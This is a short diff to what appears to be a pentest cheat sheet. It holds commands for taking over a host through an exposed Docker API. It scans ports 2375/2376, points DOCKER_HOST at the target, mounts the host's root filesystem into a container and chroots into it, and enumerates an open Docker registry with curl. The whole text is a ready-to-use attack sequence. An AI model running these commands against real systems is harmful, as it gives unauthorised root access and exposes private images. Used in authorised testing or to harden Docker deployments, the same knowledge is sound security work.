@@ -1,7 +1,12 @@
-nmap -p 2375 host # Check docker socket
-nmap -p 2376 host # Check docker encrypted socket
-export DOCKER_HOST=host:2375
+#Docker Socket
+nmap -p 2375 HOST # Check docker socket
+nmap -p 2376 HOST # Check docker encrypted socket
+export DOCKER_HOST=HOST:2375
 docker ps
 docker run -it -v /:/host ubuntu:18.04 bash
 chroot /host
 whoami
+
+#Docker Registry
+curl http://HOST:5000/v2/_catalog
+curl http://HOST:5000/v2/REPO_NAME/tags/list
